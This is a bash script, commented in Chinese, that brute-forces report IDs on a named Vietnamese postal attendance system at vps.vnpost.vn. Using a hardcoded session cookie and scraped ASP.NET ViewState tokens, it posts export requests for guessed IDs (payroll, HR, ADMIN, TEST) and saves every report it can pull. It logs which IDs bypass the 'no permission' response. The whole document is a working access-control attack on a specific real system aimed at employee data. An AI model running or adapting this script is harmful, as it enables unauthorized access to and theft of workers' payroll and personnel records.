#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 死磕到底：完整报表ID枚举"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 生成完整ID列表
cat > all_report_ids.txt << 'IDLIST'
MAU1
MAU2
MAU3
MAU4
MAU5
MAU6
MAU7
MAU8
MAU9
MAU10
BCC1
BCC2
BCC3
BCC4
BCC5
LUONG1
LUONG2
LUONG3
NHANSU1
NHANSU2
BAOCAO1
BAOCAO2
BAOCAO3
CHAMCONG1
CHAMCONG2
THONGKE1
THONGKE2
RPT1
RPT2
RPT3
REPORT1
REPORT2
ALL
TOTAL
SUMMARY
DETAIL
MASTER
ADMIN
TEST
EOF
IDLIST

echo "[*] 测试 $(wc -l < all_report_ids.txt) 个报表ID..."

success_count=0
fail_count=0

while read id; do
    echo -n "  ID=$id: "
    
    # 获取该ID的页面
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -H "Cookie: $COOKIE" 2>&1)
    
    # 提取ViewState
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    if [ -z "$VS" ]; then
        echo "⚠️  无法获取ViewState"
        ((fail_count++))
        continue
    fi
    
    # 尝试Export
    curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "report_${id}.html" 2>&1
    
    size=$(wc -c < "report_${id}.html")
    
    if [ $size -gt 3000 ] && [ $size -lt 7000 ]; then
        echo "✅ $size bytes (有效报表!)"
        echo "$id|$size|SUCCESS" >> valid_reports.txt
        ((success_count++))
        
        # 提取报表标题
        title=$(strings "report_${id}.html" | grep -i "BẢNG\|BÁO CÁO" | head -1)
        if [ -n "$title" ]; then
            echo "    标题: $title"
            echo "$id|$title" >> report_titles.txt
        fi
    elif [ $size -lt 100 ]; then
        echo "- 无权限"
        ((fail_count++))
    else
        echo "⚠️  $size bytes (错误或空)"
        ((fail_count++))
    fi
    
    sleep 0.5  # 避免过快请求
done < all_report_ids.txt

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 枚举结果:"
echo "  成功: $success_count 个"
echo "  失败: $fail_count 个"
echo ""
echo "🔥 有效报表清单:"
cat valid_reports.txt 2>/dev/null
echo ""
echo "📄 报表标题:"
cat report_titles.txt 2>/dev/null
